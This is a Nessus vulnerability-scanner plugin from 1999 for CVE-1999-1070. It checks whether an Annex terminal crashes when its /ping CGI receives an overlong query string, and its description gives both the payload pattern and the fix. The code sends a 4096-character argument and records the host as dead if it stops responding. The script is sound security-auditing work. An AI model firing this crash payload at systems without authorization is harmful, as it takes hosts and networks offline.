#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10017);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-1999-1070");
 
 name["english"] = "Annex DoS";
 name["francais"] = "Déni de service Annex";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash
the remote Annex terminal by connecting to
the HTTP port, and requesting the '/ping' CGI
script with an argument that is too long. For 
example:

  http://www.YOURSERVER.com/ping?query=AAAAA(...)AAAAA
	
An attacker may use this flaw to crash this
host, thus preventing your network from
working properly.
	
Solution : Remove the '/ping' CGI script from your 
web server.

Risk factor : High";

 desc["francais"] = "Il a été possible de faire
planter la machine distante en se connectant au
port HTTP, et en demandant le CGI '/ping' en
lui donnant un argument trop long, comme :

	GET /ping?query=AAAA(...)AAAAA
	
Un pirate peut utiliser ce problème pour 
faire planter cette machine, empechant 
ainsi votre réseau de fonctionner 
correctement.

Solution : enlevez ce CGI.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes an Annex terminal";
 summary["francais"] = "Fait planter un terminal Annex";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "http_version.nasl", "no404.nasl");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

cgi = "/ping";
if(is_cgi_installed_ka(item:cgi, port:port))
{
 soc = http_open_socket(port);
 start_denial();
 data = string(cgi, "?query=", crap(4096));
 req = http_get(item:data,port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 alive = end_denial();
 if(!alive)
 {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
   exit(0);
 }
 http_close_socket(soc);
}
